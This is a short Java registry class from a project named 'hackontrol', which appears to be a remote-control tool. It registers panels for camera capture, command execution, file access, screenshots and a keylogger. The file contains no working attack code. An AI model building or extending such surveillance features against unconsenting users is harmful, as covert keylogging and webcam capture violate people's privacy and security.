package com.khopan.hackontrol.registration;

import com.khopan.hackontrol.panel.CameraPanel;
import com.khopan.hackontrol.panel.CommandPanel;
import com.khopan.hackontrol.panel.ControlPanel;
import com.khopan.hackontrol.panel.DialogPanel;
import com.khopan.hackontrol.panel.FilePanel;
import com.khopan.hackontrol.panel.HackontrolPanel;
import com.khopan.hackontrol.panel.ImagePanel;
import com.khopan.hackontrol.panel.KeyLoggerPanel;
import com.khopan.hackontrol.panel.PanelManager;
import com.khopan.hackontrol.panel.ScreenshotPanel;

public class PanelRegistry {
	private PanelRegistry() {}

	public static void register(PanelManager manager) {
		manager.register(new HackontrolPanel());
		manager.register(new CameraPanel());
		manager.register(new CommandPanel());
		manager.register(new ControlPanel());
		manager.register(new DialogPanel());
		manager.register(new FilePanel());
		manager.register(new ImagePanel());
		manager.register(new KeyLoggerPanel());
		manager.register(new ScreenshotPanel());
	}
}
